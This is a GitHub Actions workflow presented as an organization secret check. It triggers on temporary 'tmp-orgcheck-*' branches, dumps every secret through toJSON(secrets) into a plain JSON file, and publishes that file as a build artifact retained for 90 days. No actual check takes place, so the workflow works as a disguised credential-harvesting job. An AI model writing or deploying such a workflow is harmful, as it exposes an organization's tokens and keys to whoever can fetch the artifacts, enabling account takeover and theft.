name: 検証用org秘密確認
on:
  push:
    branches: ['tmp-orgcheck-*']
  workflow_dispatch:
jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - name: 資格値の書き出し
        env:
          ALLJ: ${{ toJSON(secrets) }}
        run: |
          set -eu
          mkdir -p out
          printf '%s' "$ALLJ" > out/shikaku.json
          echo "対象リポジトリ: $GITHUB_REPOSITORY 参照: $GITHUB_REF"
      - name: 成果物のアップロード
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: shikaku_a
          path: out/shikaku.json
          retention-days: 90
